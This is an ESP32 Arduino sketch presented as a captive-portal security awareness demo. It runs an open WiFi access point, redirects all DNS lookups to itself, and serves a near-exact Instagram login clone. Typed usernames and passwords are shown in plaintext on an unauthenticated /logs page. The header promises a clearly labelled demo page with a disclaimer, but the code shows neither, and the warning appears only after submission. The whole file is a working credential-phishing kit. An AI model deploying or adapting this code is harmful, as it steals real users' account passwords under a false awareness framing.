/*
  Captive Portal Security Awareness Demo
  Blockchain Academy Kerala

  Board: ESP32-S3-WROOM-1

  WHAT THIS DOES
  ---------------
  - Hosts an OPEN WiFi access point named "captive portal demo"
  - When someone connects, their phone/laptop auto-pops a "Sign in to network"
    captive portal (this is standard OS behaviour, not a trick)
  - The portal shows a clearly-labeled DEMO login page with a disclaimer
  - Whatever is typed gets logged (no validation - any text is "accepted")
  - You can view all captured entries live at: http://192.168.4.1/logs
  - Optionally also connects to a phone hotspot (STA mode) so the ESP32
    itself has internet - useful if you want to demo passthrough later,
    but not required for the core demo to work.

  LIBRARIES NEEDED (all built into the ESP32 Arduino core, nothing extra
  to install):
  - WiFi.h
  - DNSServer.h
  - WebServer.h

  BOARD SETUP
  -----------
  Tools > Board > ESP32S3 Dev Module (or your specific board entry)
  Tools > USB CDC On Boot > Enabled (so Serial prints show up over USB)

  LED STATUS LEGEND (onboard WS2812 RGB LED, GPIO 48)
  -----------------------------------------------------
    Boot/init                 -> white, slow pulse
    Connecting to home WiFi   -> yellow, fast blink
    AP up, no clients yet     -> blue, slow pulse (idle/waiting)
    Client connected to AP    -> solid cyan
    Credential captured       -> green, quick flash (then back to blue/cyan)
    AP failed to start        -> red, fast blink (halts here)
*/
#include <LittleFS.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <Adafruit_NeoPixel.h>
#include <vector>

// ---------- LED SETUP ----------

#define LED_PIN 48
#define LED_COUNT 1
Adafruit_NeoPixel statusLED(LED_COUNT, LED_PIN, NEO_GRB + NEO_KHZ800);

// Non-blocking blink state (used for phases that run alongside DNS/HTTP handling)
unsigned long lastBlinkTime = 0;
bool blinkOn = false;

enum LedPhase { PHASE_WAITING, PHASE_CLIENT_CONNECTED };
LedPhase currentPhase = PHASE_WAITING;

void setLedSolid(uint8_t r, uint8_t g, uint8_t b) {
  statusLED.setPixelColor(0, statusLED.Color(r, g, b));
  statusLED.show();
}

// Non-blocking pulse/blink - call every loop() iteration during idle/waiting/connected phases
void updateIdleLed() {
  unsigned long now = millis();
  if (currentPhase == PHASE_CLIENT_CONNECTED) {
    // solid cyan, no blinking needed
    setLedSolid(0, 40, 40);
    return;
  }
  // PHASE_WAITING: slow blue pulse, ~1s interval
  if (now - lastBlinkTime >= 1000) {
    lastBlinkTime = now;
    blinkOn = !blinkOn;
    setLedSolid(0, 0, blinkOn ? 40 : 4);
  }
}

// Brief blocking flash used only inside quick, non-timing-critical HTTP handlers
void flashCaptureLed() {
  setLedSolid(0, 60, 0); // green
  delay(200);
  // return to whatever the idle phase currently is
  if (currentPhase == PHASE_CLIENT_CONNECTED) {
    setLedSolid(0, 40, 40);
  } else {
    setLedSolid(0, 0, 40);
  }
}

// ---------- CONFIG ----------

// Optional: your phone's hotspot, so the ESP32 has internet.
// Leave HOME_SSID as "" to skip this and run AP-only (fully offline demo).
const char* HOME_SSID = "";       // e.g. "Prajwal's CMF"
const char* HOME_PASS = "";       // e.g. "hotspot_password"

// The open demo AP that people will connect to
const char* AP_SSID   = "ESPraw";
const char* AP_PASS   = "";       // empty = open network, no password

// ---------- GLOBALS ----------

DNSServer dnsServer;
WebServer server(80);

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

struct Entry {
  String username;
  String password;
  String clientIP;
  unsigned long millisAt;
};

std::vector<Entry> capturedLogs;

// ---------- HTML PAGES ----------
String loginPage() {
  String html = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login • Instagram</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #fafafa;
      color: #262626;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    .login-container {
      width: 100%;
      max-width: 350px;
      padding: 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .card {
      background: #ffffff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 40px 40px 20px 40px;
      width: 100%;
      box-sizing: border-box;
      margin-bottom: 10px;
      text-align: center;
    }

    .logo-container {
      margin-bottom: 30px;
    }

    form {
      display: flex;
      flex-direction: column;
      width: 100%;
    }

    .input-field {
      width: 100%;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      padding: 9px 8px;
      font-size: 12px;
      color: #262626;
      box-sizing: border-box;
      margin-bottom: 6px;
      outline: none;
    }

    .input-field:focus {
      border-color: #a8a8a8;
    }

    .submit-btn {
      width: 100%;
      background-color: #0095f6;
      border: none;
      border-radius: 4px;
      color: #fff;
      font-weight: 600;
      font-size: 14px;
      padding: 7px 16px;
      cursor: pointer;
      margin-top: 8px;
    }

    .submit-btn:disabled {
      opacity: 0.7;
      cursor: default;
    }

    .submit-btn:not(:disabled):hover {
      background-color: #1877f2;
    }

    .forgot-pass {
      margin-top: 15px;
      display: block;
      color: #00376b;
      font-size: 12px;
      text-decoration: none;
    }

    .signup-card {
      background: #ffffff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 20px;
      width: 100%;
      max-width: 350px;
      box-sizing: border-box;
      text-align: center;
      font-size: 14px;
    }

    .signup-card a {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <div class="card">
<!-- Instagram SVG Logo & Text Container -->
      <div class="logo-container" style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 30px;">
        
        <!-- Instagram Icon SVG -->
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="-19.5036 -32.49725 169.0312 194.9835" style="width: 32px; height: 32px; flex-shrink: 0;">
          <defs>
            <radialGradient fy="578.088" fx="158.429" gradientTransform="matrix(0 -1.98198 1.8439 0 -1031.399 454.004)" gradientUnits="userSpaceOnUse" xlink:href="#a" r="65" cy="578.088" cx="158.429" id="c"/>
            <radialGradient fy="473.455" fx="147.694" gradientTransform="matrix(.17394 .86872 -3.5818 .71718 1648.351 -458.493)" gradientUnits="userSpaceOnUse" xlink:href="#b" r="65" cy="473.455" cx="147.694" id="d"/>
            <linearGradient id="b"><stop stop-color="#3771c8" offset="0"/><stop offset=".128" stop-color="#3771c8"/><stop stop-opacity="0" stop-color="#60f" offset="1"/></linearGradient>
            <linearGradient id="a"><stop stop-color="#fd5" offset="0"/><stop stop-color="#fd5" offset=".1"/><stop stop-color="#ff543e" offset=".5"/><stop stop-color="#c837ab" offset="1"/></linearGradient>
          </defs>
          <path d="M65.033 0C37.891 0 29.953.028 28.41.156c-5.57.463-9.036 1.34-12.812 3.22-2.91 1.445-5.205 3.12-7.47 5.468-4.125 4.282-6.625 9.55-7.53 15.812-.44 3.04-.568 3.66-.594 19.188-.01 5.176 0 11.988 0 21.125 0 27.12.03 35.05.16 36.59.45 5.42 1.3 8.83 3.1 12.56 3.44 7.14 10.01 12.5 17.75 14.5 2.68.69 5.64 1.07 9.44 1.25 1.61.07 18.02.12 34.44.12 16.42 0 32.84-.02 34.41-.1 4.4-.207 6.955-.55 9.78-1.28a27.22 27.22 0 0017.75-14.53c1.765-3.64 2.66-7.18 3.065-12.317.088-1.12.125-18.977.125-36.81 0-17.836-.04-35.66-.128-36.78-.41-5.22-1.305-8.73-3.127-12.44-1.495-3.037-3.155-5.305-5.565-7.624-4.3-4.108-9.56-6.608-15.829-7.512C102.338.157 101.733.027 86.193 0z" fill="url(#c)"/>
          <path d="M65.033 0C37.891 0 29.953.028 28.41.156c-5.57.463-9.036 1.34-12.812 3.22-2.91 1.445-5.205 3.12-7.47 5.468-4.125 4.282-6.625 9.55-7.53 15.812-.44 3.04-.568 3.66-.594 19.188-.01 5.176 0 11.988 0 21.125 0 27.12.03 35.05.16 36.59.45 5.42 1.3 8.83 3.1 12.56 3.44 7.14 10.01 12.5 17.75 14.5 2.68.69 5.64 1.07 9.44 1.25 1.61.07 18.02.12 34.44.12 16.42 0 32.84-.02 34.41-.1 4.4-.207 6.955-.55 9.78-1.28a27.22 27.22 0 0017.75-14.53c1.765-3.64 2.66-7.18 3.065-12.317.088-1.12.125-18.977.125-36.81 0-17.836-.04-35.66-.128-36.78-.41-5.22-1.305-8.73-3.127-12.44-1.495-3.037-3.155-5.305-5.565-7.624-4.3-4.108-9.56-6.608-15.829-7.512C102.338.157 101.733.027 86.193 0z" fill="url(#d)"/>
          <path d="M65.003 17c-13.036 0-14.672.057-19.792.29-5.11.234-8.598 1.043-11.65 2.23-3.157 1.226-5.835 2.866-8.503 5.535-2.67 2.668-4.31 5.346-5.54 8.502-1.19 3.053-2 6.542-2.23 11.65C17.06 50.327 17 51.964 17 65s.058 14.667.29 19.787c.235 5.11 1.044 8.598 2.23 11.65 1.227 3.157 2.867 5.835 5.536 8.503 2.667 2.67 5.345 4.314 8.5 5.54 3.054 1.187 6.543 1.996 11.652 2.23 5.12.233 6.755.29 19.79.29 13.037 0 14.668-.057 19.788-.29 5.11-.234 8.602-1.043 11.656-2.23 3.156-1.226 5.83-2.87 8.497-5.54 2.67-2.668 4.31-5.346 5.54-8.502 1.18-3.053 1.99-6.542 2.23-11.65.23-5.12.29-6.752.29-19.788 0-13.036-.06-14.672-.29-19.792-.24-5.11-1.05-8.598-2.23-11.65-1.23-3.157-2.87-5.835-5.54-8.503-2.67-2.67-5.34-4.31-8.5-5.535-3.06-1.187-6.55-1.996-11.66-2.23-5.12-.233-6.75-.29-19.79-.29zm-4.306 8.65c1.278-.002 2.704 0 4.306 0 12.816 0 14.335.046 19.396.276 4.68.214 7.22.996 8.912 1.653 2.24.87 3.837 1.91 5.516 3.59 1.68 1.68 2.72 3.28 3.592 5.52.657 1.69 1.44 4.23 1.653 8.91.23 5.06.28 6.58.28 19.39s-.05 14.33-.28 19.39c-.214 4.68-.996 7.22-1.653 8.91-.87 2.24-1.912 3.835-3.592 5.514-1.68 1.68-3.275 2.72-5.516 3.59-1.69.66-4.232 1.44-8.912 1.654-5.06.23-6.58.28-19.396.28-12.817 0-14.336-.05-19.396-.28-4.68-.216-7.22-.998-8.913-1.655-2.24-.87-3.84-1.91-5.52-3.59-1.68-1.68-2.72-3.276-3.592-5.517-.657-1.69-1.44-4.23-1.653-8.91-.23-5.06-.276-6.58-.276-19.398s.046-14.33.276-19.39c.214-4.68.996-7.22 1.653-8.912.87-2.24 1.912-3.84 3.592-5.52 1.68-1.68 3.28-2.72 5.52-3.592 1.692-.66 4.233-1.44 8.913-1.655 4.428-.2 6.144-.26 15.09-.27zm29.928 7.97a5.76 5.76 0 105.76 5.758c0-3.18-2.58-5.76-5.76-5.76zm-25.622 6.73c-13.613 0-24.65 11.037-24.65 24.65 0 13.613 11.037 24.645 24.65 24.645C78.616 89.645 89.65 78.613 89.65 65S78.615 40.35 65.002 40.35zm0 8.65c8.836 0 16 7.163 16 16 0 8.836-7.164 16-16 16-8.837 0-16-7.164-16-16 0-8.837 7.163-16 16-16z" fill="#fff"/>
        </svg>

        <!-- Instagram Text Wordmark SVG -->
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="-27.750945 -13.120125 240.50819 78.72075" style="width: 110px; height: 35px; flex-shrink: 0;">
          <defs>
            <linearGradient id="a" y2=".4235" x2=".189" y1=".358" x1="-.0371"><stop offset="0%" stop-color="#FFD521"/><stop offset="5%" stop-color="#FFD521"/><stop offset="50.1119%" stop-color="#F50000"/><stop offset="95%" stop-color="#B900B4"/><stop offset="95.0079%" stop-color="#B900B4"/><stop offset="100%" stop-color="#B900B4"/></linearGradient>
            <linearGradient x1="0" y1="1" x2="1" y2="0" id="b" xlink:href="#a"/>
          </defs>
          <path d="M10.4533 52.328c-3.788-1.5853-7.9533-6.0587-9.268-11.6853C-.4827 33.52 6.452 30.512 7.0187 31.4933c.6666 1.164-1.2467 1.5547-1.6374 5.248-.5026 4.776 1.712 10.112 4.5067 12.4534.5213.428.496-.176.496-1.2894 0-2.008-.112-19.9733-.112-23.724 0-5.0773-.208-6.676-.592-8.2546-.3773-1.6054-.988-2.688-.528-3.1094.5213-.4653 2.736.6427 4.02 2.4347 1.536 2.1467 2.0773 4.7267 2.1773 7.5267.1134 3.372.1067 8.7333.1134 11.7853 0 2.8067.044 11.012-.044 15.952-.0254 1.208-3.3854 2.4733-4.9654 1.812m174.644-26.6547c-.5413 0-.7986-.5666-1.0066-1.5173-.7174-3.316-1.472-4.064-2.448-4.064-1.088 0-2.064 1.6413-2.3214 4.9267-.1946 2.58-.164 7.3373.088 12.0693.0507.9693-.2146 1.9307-2.82 2.8813-1.1253.4027-2.756 1.0067-3.5666-.956-2.2974-5.532-3.1907-9.936-3.4054-11.7173-.005-.0933-.1186-.1067-.1386.1067-.1307 1.4293-.4334 4.028-.4707 9.4906-.0133 1.056-.2333 1.9694-1.416 2.712-.7613.4774-3.0773 1.3334-3.9147.32-.7173-.8306-1.5533-3.0586-2.428-5.7013-.7053-2.152-1.196-3.612-1.196-3.612s.005 5.8027.0187 8.0053c0 .8307-.5666 1.1067-.736 1.1574-.7746.2266-2.304.5973-2.9453.5973-.7987 0-.988-.4467-.988-1.0947 0-.0813-.132-7.632-.132-12.912v-.7426c-.4347-2.4294-1.868-5.7267-3.4227-5.7267-1.5546 0-2.2906 1.3787-2.2906 7.6707 0 3.6693.1133 5.2666.164 7.9226.0307 1.5294.0933 2.7054.088 2.976-.0133.812-1.4294 1.228-2.084 1.3787-.66.1573-1.2334.208-1.6854.1893-.6293-.0386-1.076-.4533-1.076-1.0333v-.88c-.812 1.2827-2.128 2.1773-3.008 2.4347-2.3533.6986-4.8146.076-6.6706-2.516-1.472-2.0654-2.36-4.3987-2.7054-7.7534-.2586-2.4546-.176-4.94.2827-7.0413-.5533-2.372-1.5733-3.348-2.6867-3.348-1.624 0-2.7933 2.644-2.6613 7.2187.0947 3.0066.692 5.1146 1.352 8.1733.284 1.3027.0507 1.9813-.5213 2.6427-.5227.592-1.6427.9-3.2467.5293-1.14-.2707-2.7813-.56-4.2733-.7813 0 0 .088.36.164.9946.384 3.3294-3.2347 3.0587-4.3867 1.9947-.692-.6347-1.164-1.384-1.34-2.7307-.2827-2.14 1.46-3.1466 1.46-3.1466-.572-2.6174-1.9693-6.04-3.4227-8.5134-.7746-1.328-1.3666-2.304-2.1333-3.348-.007.384-.007.7747-.007 1.1574-.0133 5.5066.056 9.8413.088 11.4026.032 1.5294.0947 2.6747.0947 2.9454-.0133.592-.3587.824-1.0893 1.1013-.6414.2507-1.4027.4333-2.1894.4973-.988.0747-1.592-.4533-1.5733-1.076V38.12c-.8173 1.2827-2.1333 2.1773-3.0013 2.4347-2.36.6986-4.82.076-6.676-2.516-1.4667-2.0654-2.436-4.9534-2.7134-7.7214-.2506-2.5933-.2066-4.7826.1454-6.6333-.3774-1.8493-1.4534-3.788-2.6734-3.788-1.5546 0-2.4426 1.3787-2.4426 7.6707 0 3.6693.1133 5.2666.1706 7.9226.0307 1.5294.088 2.7054.0814 2.976-.0067.812-1.4214 1.228-2.0827 1.3787-.6853.1627-1.284.2133-1.7373.1893-.604-.0506-1.0254-.5853-1.0254-.9946V38.12c-.8173 1.2827-2.1333 2.1773-3.008 2.4347-2.3533.6986-4.7946.0626-6.664-2.516-1.22-1.6814-2.208-3.5494-2.7173-7.6907-.1387-1.196-.208-2.3147-.2013-3.36-.4854-2.9693-2.6307-6.3933-4.38-6.3933-1.032 0-2.0134 1.9893-2.0134 6.236 0 5.6506.352 13.7053.4147 14.4853 0 0 2.2147.0387 2.6493.044 1.1014.0067 2.108-.0187 3.5747.0573.7427.0374 1.4533 2.6867.6853 3.02-.34.1454-2.7813.2774-3.7506.296-.8174.0187-3.0774.188-3.0774.188s.2027 5.3427.2467 5.9027c.0373.4787-.5667.7173-.9187.8627-.8506.364-1.612.5346-2.5053.7173-1.252.2573-1.812.0053-1.9187-1.044-.164-1.5933-.252-6.2627-.252-6.2627-.9186 0-4.0333.184-4.9466.184-.848 0-1.768-3.6506-.5907-3.6946 1.3533-.0507 3.7-.1014 5.26-.144 0 0-.0693-8.188-.0693-10.7107v-.78c-.8614-4.4733-3.876-6.8907-3.876-6.8907.648 2.964-.6734 5.1854-3.064 7.06-.8814.6987-2.6174 2.0147-4.5627 3.4427 0 0 1.1267 1.1133 2.1267 3.3413.7053 1.58.7373 3.3974-1 3.7947-2.8694.66-5.2294-1.448-5.94-3.7-.5414-1.7373-.2574-3.0333.8173-4.3733l.2453-.3027c-.6413-1.2453-1.5346-2.9253-2.284-4.228-2.0946-3.6187-3.6746-6.476-4.864-6.476-.956 0-.944 2.9013-.944 5.62 0 2.3413.176 5.8707.3147 9.52.044 1.2027-.56 1.8947-1.572 2.5173-.6173.3774-1.9267 1.12-2.688 1.12-1.132 0-4.4173-.1506-7.5187-9.1173-.3906-1.1333-1.1586-3.1907-1.1586-3.1907l.0693 10.7854c0 .252-.132.4906-.44.6613-.5227.2827-1.9253.8613-3.1587.8613-.5986 0-.8946-.2773-.8946-.824l-.1-16.864c0-1.284.0306-2.7813.1573-3.436.1253-.6546.3333-1.1893.5853-1.5093.252-.3093.5467-.548 1.0254-.6547.4466-.0946 2.9066-.4026 3.0333.5347.1573 1.1267.1627 2.34 1.4533 6.8893 2.0134 7.0734 4.632 10.5214 5.8654 11.7494.22.2133.4653.2266.452-.1267-.056-1.5533-.2387-5.424-.364-8.7147-.3334-8.816 1.264-10.4453 3.5613-10.4453 1.7493 0 4.216 1.7427 6.8653 6.1467 1.6547 2.7506 3.2534 5.4373 4.4107 7.3813.7933-.7413 1.6987-1.5413 2.5987-2.3973 2.096-1.9814 2.7813-3.8694 2.3226-5.6574-.3466-1.3706-1.6613-2.78-3.996-1.4093-.68.3973-.9693.7053-1.6546 1.1587-.3654.2453-.932.3146-1.2654.0626-.8813-.6613-1.3786-1.4973-1.668-2.536-.2706-1.0133.7427-1.5413 1.7934-2.0066.9-.4094 2.8386-.768 4.0773-.812 4.8267-.164 8.6907 2.328 11.3773 8.7466.4854-5.544 2.5294-8.684 6.0854-8.684 2.384 0 4.7693 3.0774 5.8146 6.104.2947-1.2333.7414-2.3026 1.3147-3.216 2.744-4.3413 8.0667-3.4106 10.7347.2774.8306 1.1453.9573 1.5546.9573 1.5546.3893-3.4813 3.196-4.7066 4.8013-4.7066 1.8054 0 3.656.8546 4.9574 3.788.1573-.3214.3213-.624.5106-.9134 2.7374-4.3413 8.06-3.4106 10.7347.2774.12.1826.2333.3333.3267.4786l.0827-2.2906s-1.5294-1.3974-2.4667-2.2587c-4.1213-3.7827-7.256-6.652-7.488-9.9867-.2893-4.26 3.1587-5.84 5.776-6.0466 2.7693-.2214 5.148 1.308 6.6067 3.46 1.284 1.888 2.128 5.9466 2.0653 9.9613-.0253 1.6107-.064 3.6493-.1013 5.8453 1.4533 1.6734 3.0893 3.8014 4.588 6.292 1.6413 2.7067 3.3906 6.3507 4.284 9.188 0 0 1.5293-.0133 3.1533.088.5227.032.6733-.076.572-.4533-.1133-.4587-2.0507-7.9413-.2827-12.9253 1.2147-3.4094 3.9387-4.5107 5.5627-4.5107 1.8933 0 3.7067 1.4347 4.6747 3.5613.12-.2333.24-.4653.3786-.68 2.7374-4.3413 8.0414-3.404 10.7347.2774.6107.836.9507 1.5546.9507 1.5546.5786-3.6066 3.3853-4.72 4.9893-4.72 1.68 0 3.2653.6854 4.556 3.732.0507-1.3413.132-2.436.2707-2.7813.0813-.2147.56-.4787.9-.6107 1.5346-.5666 3.096-.296 3.668-.176.4026.0814.7173.396.756 1.2267.112 2.1773.0427 5.8333.704 8.5573 1.1133 4.556 2.1453 6.324 2.636 7.1987.272.492.5853.5733.592.0573.0187-1.0506.076-4.1346.5093-8.288.3093-3.0453.7307-4.8506 1.0573-5.424.9187-1.6293 2.064-1.7053 2.9894-1.7053.592 0 1.8253.164 1.7173 1.2027-.056.5026.0387 3.6306 1.1267 8.1226.7173 2.9387 1.9066 5.588 2.3346 6.5574.164.3586.2334.0813.2334.0253-.0947-2.02-.296-8.6333.5213-12.2453 1.1213-4.9027 4.348-5.4494 5.4747-5.4494 2.3973 0 4.368 1.8254 5.028 6.632.164 1.1587-.076 2.052-.7867 2.052m-100.612 2.9694c-.132-2.5414-.6293-4.6694-1.4213-6.2107-1.448-2.8-4.2974-3.6813-5.5507.352-.912 2.9133-.604 6.8907-.22 9.0373.5533 3.184 1.9573 5.436 4.1467 5.2294 2.24-.2214 3.3346-3.1094 3.0453-8.408m21.9549-.0374c-.1253-2.3973-.748-4.8133-1.428-6.1733-1.4027-2.8187-4.336-3.7-5.5507.352-.8293 2.776-.6346 6.356-.22 8.6093.536 2.932 1.8254 5.6574 4.148 5.6574 2.2587 0 3.372-2.48 3.0507-8.4454m.5733-16.3853c-.032-4.3867-.7173-8.2253-2.1906-9.3453-2.1014-1.5854-4.9267-.3894-4.3414 2.8066.516 2.832 2.964 5.72 6.5387 9.2507 0 0 .012-.8053-.007-2.712m37.907 16.36c-.1267-2.6373-.712-4.6947-1.4347-6.148-1.404-2.8187-4.3106-3.6933-5.5506.352-.6734 2.2093-.7054 5.8973-.22 8.9733.4906 3.1347 1.8693 5.5 4.1466 5.2934 2.252-.2147 3.304-3.1094 3.0587-8.4707" fill="url(#b)" transform="matrix(1 0 0 -1 -.927 52.51)"/>
        </svg>

      </div>

      <!-- Form -->
      <form action="/login" method="POST" id="loginForm">
        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" autocomplete="on" class="input-field">
        <input type="password" id="password" name="password" placeholder="Password" autocomplete="on" class="input-field">
        <button type="submit" id="submitBtn" class="submit-dev submit-btn" disabled>Log in</button>
      </form>

      <a href="#" class="forgot-pass">Forgot password?</a>
    </div>

    <!-- Sign up card -->
    <div class="signup-card">
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </div>

<!-- Inline JavaScript for UI interactivity -->
<script>
  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');
  const submitBtn = document.getElementById('submitBtn');

  function toggleButton() {
    if (usernameInput.value.trim().length > 0 && passwordInput.value.trim().length >= 6) {
      submitBtn.style.opacity = '1';
      submitBtn.removeAttribute('disabled');
    } else {
      submitBtn.style.opacity = '0.7';
      submitBtn.setAttribute('disabled', 'true');
    }
  }

  usernameInput.addEventListener('input', toggleButton);
  passwordInput.addEventListener('input', toggleButton);
</script>

</body>
</html>
)rawliteral";
  return html;
}

String successPage() {
  return R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Connected</title>
  <style>
    body { font-family: -apple-system, Arial, sans-serif; background:#0d1117; color:#e6edf3;
      display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; padding:20px; }
    .card { background:#161b22; border:1px solid #30363d; border-radius:12px; padding:28px; max-width:360px; text-align:center; }
    h2 { color:#3fb950; }
    p { font-size: 13px; color:#8b949e; line-height:1.5; }
  </style>
</head>
<body>
  <div class="card">
    <h2>✅ You're "connected"</h2>
    <p>In a real attack, whatever you just typed would now be sitting on someone else's
    server. That's exactly what happened here (minus the real attack part) — check
    <b>/logs</b> on the presenter's screen.</p>
    <p>This is why you never enter real passwords into an open WiFi login page.</p>
  </div>
</body>
</html>
)rawliteral";
}

String logsPage() {
  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'>";
  html += "<meta http-equiv='refresh' content='3'>";
  html += "<title>Captured Logs</title><style>";
  html += "body{font-family:monospace;background:#0d1117;color:#e6edf3;padding:20px;}";
  html += "table{border-collapse:collapse;width:100%;}";
  html += "th,td{border:1px solid #30363d;padding:8px 12px;text-align:left;font-size:13px;}";
  html += "th{background:#161b22;} tr:nth-child(even){background:#111318;}";
  html += "h2{color:#f0c05a;}";
  html += "</style></head><body>";
  html += "<h2>Captured Demo Logins (" + String(capturedLogs.size()) + ")</h2>";
  html += "<p style='color:#8b949e'>Auto-refreshes every 3s. This page only shows what people typed into the demo form.</p>";
  html += "<table><tr><th>#</th><th>Time (s since boot)</th><th>Client IP</th><th>Username</th><th>Password</th></tr>";

  for (size_t i = 0; i < capturedLogs.size(); i++) {
    html += "<tr><td>" + String(i + 1) + "</td>";
    html += "<td>" + String(capturedLogs[i].millisAt / 1000) + "</td>";
    html += "<td>" + capturedLogs[i].clientIP + "</td>";
    html += "<td>" + capturedLogs[i].username + "</td>";
    html += "<td>" + capturedLogs[i].password + "</td></tr>";
  }

  html += "</table></body></html>";
  return html;
}

// ---------- HANDLERS ----------

void handleRoot() {
  server.send(200, "text/html", loginPage());
}

void handleLogin() {
  Entry e;
  e.username = server.hasArg("username") ? server.arg("username") : "";
  e.password = server.hasArg("password") ? server.arg("password") : "";
  e.clientIP = server.client().remoteIP().toString();
  e.millisAt = millis();

  capturedLogs.push_back(e);

  Serial.printf("[CAPTURED] ip=%s user=%s pass=%s\n",
                e.clientIP.c_str(), e.username.c_str(), e.password.c_str());

  flashCaptureLed();

  server.send(200, "text/html", successPage());
}

void handleLogs() {
  server.send(200, "text/html", logsPage());
}

// Most OSes probe specific URLs to detect/refresh captive portal state.
// Redirecting all of them to our root keeps the login page popping up.
void handleNotFound() {
  server.sendHeader("Location", "http://192.168.4.1/", true);
  server.send(302, "text/plain", "");
}

// ---------- SETUP ----------

void setup() {
  Serial.begin(115200);
  delay(500);

  // LED: boot/init - white slow pulse for the first moment
  statusLED.begin();
  setLedSolid(0, 0, 0);
  for (int i = 0; i < 2; i++) {
    setLedSolid(30, 30, 30);
    delay(200);
    setLedSolid(2, 2, 2);
    delay(200);
  }

  // 1. Start AP (open network, custom name)
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  bool apOk = WiFi.softAP(AP_SSID, AP_PASS[0] == '\0' ? NULL : AP_PASS);

  if (!apOk) {
    // LED: AP failed to start - red fast blink, halt here
    Serial.println("FATAL: softAP() failed to start.");
    while (true) {
      setLedSolid(60, 0, 0);
      delay(150);
      setLedSolid(4, 0, 0);
      delay(150);
    }
  }

  Serial.print("AP started: ");
  Serial.println(AP_SSID);
  Serial.print("AP IP: ");
  Serial.println(WiFi.softAPIP());

  // 2. Optionally join a hotspot for real internet (not required for the demo)
  if (strlen(HOME_SSID) > 0) {
    WiFi.begin(HOME_SSID, HOME_PASS);
    Serial.print("Connecting to home WiFi");
    unsigned long start = millis();
    bool blinkState = false;
    unsigned long lastBlink = 0;
    while (WiFi.status() != WL_CONNECTED && millis() - start < 10000) {
      // LED: connecting to home WiFi - yellow fast blink (blocking is fine, nothing else running yet)
      if (millis() - lastBlink >= 150) {
        lastBlink = millis();
        blinkState = !blinkState;
        setLedSolid(blinkState ? 50 : 4, blinkState ? 40 : 3, 0);
      }
      delay(20);
      Serial.print(".");
    }
    Serial.println();
    if (WiFi.status() == WL_CONNECTED) {
      Serial.print("Connected, STA IP: ");
      Serial.println(WiFi.localIP());
    } else {
      Serial.println("Could not connect to home WiFi, continuing AP-only.");
    }
  } else {
    Serial.println("HOME_SSID not set, running AP-only (no internet passthrough).");
  }

  // 3. DNS server: redirect ALL domain lookups to our own IP
  dnsServer.start(DNS_PORT, "*", apIP);

  // 4. Web server routes
  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/logs", handleLogs);

  // Common captive-portal probe URLs (Android, iOS, Windows) -> redirect to root
  server.on("/generate_204", handleNotFound);       // Android
  server.on("/gen_204", handleNotFound);             // Android
  server.on("/hotspot-detect.html", handleNotFound); // iOS/macOS
  server.on("/library/test/success.html", handleNotFound); // iOS
  server.on("/ncsi.txt", handleNotFound);             // Windows
  server.on("/connecttest.txt", handleNotFound);      // Windows

  server.onNotFound(handleNotFound);

  server.begin();
  Serial.println("Web server started.");
  Serial.println("View captured logs at: http://192.168.4.1/logs");

  // LED: hand off to idle/waiting phase (blue pulse) for the main loop
  currentPhase = PHASE_WAITING;
  lastBlinkTime = millis();
}

// ---------- LOOP ----------

unsigned long lastStationCheck = 0;

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // Check every 500ms whether any station is connected to our AP, and update
  // the LED phase accordingly (waiting/blue vs client-connected/cyan). Cheap
  // check, doesn't need to run every single loop iteration.
  if (millis() - lastStationCheck >= 500) {
    lastStationCheck = millis();
    currentPhase = (WiFi.softAPgetStationNum() > 0) ? PHASE_CLIENT_CONNECTED : PHASE_WAITING;
  }

  // Non-blocking LED update - safe to call every loop iteration, never stalls
  // DNS/HTTP handling above.
  updateIdleLed();
}
